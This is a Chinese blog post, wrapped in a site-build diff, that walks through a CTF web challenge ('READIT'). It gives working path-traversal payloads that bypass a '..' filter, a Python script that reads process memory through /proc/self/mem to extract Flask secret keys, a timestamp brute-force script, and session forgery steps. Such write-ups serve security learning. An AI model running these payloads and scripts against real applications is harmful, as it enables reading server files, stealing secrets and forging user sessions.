@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="2023国赛CTF初赛WEB-READIT复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023国赛CTF初赛WEB-READIT复现">
+<meta property="og:url" content="http://example.com/undefined/59bc99f5.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="2023国赛CTF初赛WEB-READIT复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530181449351.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530181537084.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530181712589.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530182339485.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530182803158.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530183028724.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170119.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170139.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170035.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170045.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230530201950885.png">
+<meta property="article:published_time" content="2024-09-28T12:20:25.000Z">
+<meta property="article:modified_time" content="2024-09-28T12:23:27.500Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/undefined/undefined/image-20230530181449351.png">
+
+<link rel="canonical" href="http://example.com/undefined/59bc99f5.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2023国赛CTF初赛WEB-READIT复现 | So1Lupus</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/59bc99f5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023国赛CTF初赛WEB-READIT复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-28 20:20:25 / 修改时间：20:23:27" itemprop="dateCreated datePublished" datetime="2024-09-28T20:20:25+08:00">2024-09-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="2023国赛CTF初赛WEB-READIT复现"><a href="#2023国赛CTF初赛WEB-READIT复现" class="headerlink" title="2023国赛CTF初赛WEB-READIT复现"></a>2023国赛CTF初赛WEB-READIT复现</h1><span id="more"></span>
+
+<blockquote>
+<p>在本地搭建环境进行的复现，所以某些地方会与做题时有些许不同，不过并不影响整体做题思路</p>
+</blockquote>
+<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>首先登录界面后，就是一个很简单的web页面。</p>
+<img src="/undefined/undefined/image-20230530181449351.png" class="">
+
+<p>点击提交后，我们会发现我们跳转到了另一个页面并且url上多了几个参数。</p>
+<img src="/undefined/undefined/image-20230530181537084.png" class="">
+
+<p>此时我们可以猜想，这个book参数是否存在一个目录穿越导致任意文件读的漏洞，于是利用如下payload进行一个初步的验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>但是发现并不能成功读取文件，那难道是我们的思路有问题吗？</p>
+<img src="/undefined/undefined/image-20230530181712589.png" class="">
+
+<p>此时，我们回过头来再想想，这个实现的逻辑是什么，而后端的代码是如何实现这个逻辑的。很显然，这里实现将书籍显示出来的功能肯定要涉及到一个文件读取的逻辑或者文件包含的逻辑，那么肯定有一处参数是涉及这个文件读取的，然后我们回过头来仔细看，这里的选择的书籍名称和book一样（题目环境貌似是相近，没有完全一样），我们有理由肯定此处存在文件读取的功能，那么为什么我们做不到任意文件读呢？有一种可能是存在waf，它将我们的某些字符过滤了，那这里毕竟是ctf比赛，不是真实环境，既然题目的名字也叫readit，那说明这个肯定还是存在一个文件读取的漏洞的。所以把常见的绕过payload都试一试咯，然后如下payload成功读取了文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../.../.../.../.../.../.../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<img src="/undefined/undefined/image-20230530182339485.png" class="">
+
+<p>既然如此我们便可以去去读**&#x2F;proc&#x2F;self&#x2F;cmdline**来看下当下执行的是什么命令</p>
+<img src="/undefined/undefined/image-20230530182803158.png" class="">
+
+<p>然后发现用gunicorn起了个python服务，所以尝试去读文件源码**&#x2F;app&#x2F;server.py**</p>
+<img src="/undefined/undefined/image-20230530183028724.png" class="">
+
+<p>源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line">key = hashlib.md5(<span class="built_in">str</span>(time.time_ns()).encode()).hexdigest()</span><br><span class="line">books = os.listdir(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">books.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        book = session[<span class="string">&#x27;book&#x27;</span>]</span><br><span class="line">        page = session[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">        page_size = session[<span class="string">&#x27;page_size&#x27;</span>]</span><br><span class="line">        total_pages = session[<span class="string">&#x27;total_pages&#x27;</span>]</span><br><span class="line">        filepath = session[<span class="string">&#x27;filepath&#x27;</span>]</span><br><span class="line">        words = read_file_page(filepath, page, page_size)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books )</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/books&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book_page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;book&#x27;</span>):</span><br><span class="line">        book = request.args.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        book = session.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, message=<span class="string">&#x27;I need book&#x27;</span>)</span><br><span class="line">    book=book.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    filepath = <span class="string">&#x27;./books/&#x27;</span> + book</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;page_size&#x27;</span>):</span><br><span class="line">        page_size = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page_size = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page_size = <span class="number">3000</span></span><br><span class="line">    total_pages = math.ceil(os.path.getsize(filepath) / page_size)</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;page&#x27;</span>):</span><br><span class="line">        page = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    words = read_file_page(filepath, page, page_size)</span><br><span class="line">    prev_page = page - <span class="number">1</span> <span class="keyword">if</span> page &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    next_page = page + <span class="number">1</span> <span class="keyword">if</span> page &lt; total_pages <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;book&#x27;</span>] = book</span><br><span class="line">    session[<span class="string">&#x27;page&#x27;</span>] = page</span><br><span class="line">    session[<span class="string">&#x27;page_size&#x27;</span>] = page_size</span><br><span class="line">    session[<span class="string">&#x27;total_pages&#x27;</span>] = total_pages</span><br><span class="line">    session[<span class="string">&#x27;prev_page&#x27;</span>] = prev_page</span><br><span class="line">    session[<span class="string">&#x27;next_page&#x27;</span>] = next_page</span><br><span class="line">    session[<span class="string">&#x27;filepath&#x27;</span>] = filepath</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words )</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:</span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_page</span>(<span class="params">filename, page_number, page_size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size+i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.seek(offset)</span><br><span class="line">                    words = file.read(size)</span><br><span class="line">                    <span class="keyword">return</span> words.decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="comment">#if error again</span></span><br><span class="line">    offset = (page_number - <span class="number">1</span>) * page_size</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.seek(offset)</span><br><span class="line">        words = file.read(page_size)</span><br><span class="line">        <span class="keyword">return</span> words.split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;8000&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后发现，想要拿到路由我们必须伪造session_key，此处我们需要两个的值，一个是 key的值，一个是SECRET_KEY的值。那么我们该如何得到这两个值呢，config文件中也没有泄露。此时我们可以联想到之前2022蓝帽杯的一道web题，file_session,有一说一，这个是那题思路的一半部分。有兴趣的可以自己去看看。简单讲就是我们可以通过**&#x2F;proc&#x2F;self&#x2F;maps<strong>获取内存分配，然后再根据内存分配信息在</strong>&#x2F;proc&#x2F;self&#x2F;mem**进行内容的读取。此时我们就需要编写脚本来获取我们想要的内容</p>
+<h2 id="0x02-获取KEY，SECRET-KEY"><a href="#0x02-获取KEY，SECRET-KEY" class="headerlink" title="0x02 获取KEY，SECRET_KEY"></a>0x02 获取KEY，SECRET_KEY</h2><p>此处主要需要根据key和SECRET_KEY的特征来筛选内容，但是由于两者都没有明显的特征导致在编写脚本的过程中最难的地方就是找寻特征最后终于找到了合适的特征来筛选处内容，粗糙的脚本如下,然后经过测试，大部分情况下都能直接且正确的找到目标，且大部分情况下，如果第一次运行没有找到，那么多运行几次便能找到目标。该脚本也是在一些大佬的获取内存数据的代码基础上进行了进一步的特征提取，获取目标值的内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8000/&quot;</span></span><br><span class="line">maps_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/books?page_size=8000&amp;book=.../.../.../.../.../.../proc/self/maps&quot;</span></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span></span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>) - <span class="built_in">int</span>(start, <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># print(Offset,Length)</span></span><br><span class="line">    Offset = <span class="built_in">int</span>(Offset)</span><br><span class="line">    Length = <span class="built_in">int</span>(Length)</span><br><span class="line">    <span class="comment"># print(Offset)</span></span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/books?page=<span class="subst">&#123;<span class="built_in">int</span>((Offset/Length)+<span class="number">1</span>)&#125;</span>&amp;book=.../.../.../.../.../.../proc/self/mem&amp;page_size=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    res = requests.get(read_url)</span><br><span class="line">    <span class="keyword">if</span>(res.status_code != <span class="number">200</span>):</span><br><span class="line">        read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/books?page=<span class="subst">&#123;<span class="built_in">int</span>((Offset/Length)+<span class="number">2</span>)&#125;</span>&amp;book=.../.../.../.../.../.../proc/self/mem&amp;page_size=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># print(read_url)</span></span><br><span class="line">        res = requests.get(read_url)</span><br><span class="line">        <span class="keyword">if</span>(res.status_code != <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(Offset,<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(Offset,<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.content.find(<span class="string">b&quot;\\xff\\xff\\xff\\xe4\\x00\\x87\\x01\\x97\\x00d\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;</span>) != -<span class="number">1</span> <span class="keyword">and</span> res.content.find(<span class="string">b&quot;\\x00\\x02S\\x00\\x00\\x00&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        num = re.findall(<span class="string">&quot;00[0-9a-f]&#123;32&#125;&quot;</span>,res.text.replace(<span class="string">&quot;\\x00&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(num)!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<img src="/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170119.png" class="">
+
+<p>如图所示，前者为SECRET_KEY，后者为key，去掉开头的00后就是对应的值。</p>
+<h2 id="0x03-爆破key"><a href="#0x03-爆破key" class="headerlink" title="0x03 爆破key"></a>0x03 爆破key</h2><p>紧接着，我们就需要爆破key的值，此处我们需要根据session来获取一个时间戳来作为一个锚点，因为从代码中我们可以知道，session的生成的时间取决于我们何时访问**&#x2F;books**路由，而key生成的时间取决于程序合适开始运行，所以我们需要以session的为起点，往前疯狂爆破，只能说，很crazy。因为本地环境下，我们可以通过快速访问生成session来减小两者的时间差，但是题目环境中就不会那么友好了。</p>
+<p>session时间戳位置：</p>
+<img src="/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170139.png" class="">
+
+<p>获取时间戳的值：</p>
+<img src="/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170035.png" class="">
+
+<p>但由于此处是纳秒级的时间戳，所以，在此基础之上还需要往后面加9个0，然后再往前爆破。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">origin=<span class="number">1685436396000000000</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(origin).encode()).hexdigest() == <span class="string">&quot;34089e332229929cfc64344e3baf4f61&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(origin)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        origin=origin-<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/undefined/undefined/QQ%E6%88%AA%E5%9B%BE20230530170045.png" class="">
+
+<p>本地可以直接单线程，但是根据情况我们应该需要编写多线程脚本来降低爆破的时间，或者利用其它工具来降低爆破时间提高成功率。</p>
+<h2 id="0x04伪造session"><a href="#0x04伪造session" class="headerlink" title="0x04伪造session"></a>0x04伪造session</h2><p>这个应该都比较熟悉，flask伪造session，利用脚本<strong>flask_session_cookie_manager</strong>就好了，因为此处已经获得了key的原值和SECRET_KEY，所以可以直接伪造。</p>
+<img src="/undefined/undefined/image-20230530201950885.png" class="">
+
+<p>最后就可以拿到flag了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/68b58dca.html" rel="prev" title="CVE-2023-41599">
+      <i class="fa fa-chevron-left"></i> CVE-2023-41599
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2023%E5%9B%BD%E8%B5%9BCTF%E5%88%9D%E8%B5%9BWEB-READIT%E5%A4%8D%E7%8E%B0"><span class="nav-text">2023国赛CTF初赛WEB-READIT复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">0x01 信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%8E%B7%E5%8F%96KEY%EF%BC%8CSECRET-KEY"><span class="nav-text">0x02 获取KEY，SECRET_KEY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%88%86%E7%A0%B4key"><span class="nav-text">0x03 爆破key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04%E4%BC%AA%E9%80%A0session"><span class="nav-text">0x04伪造session</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
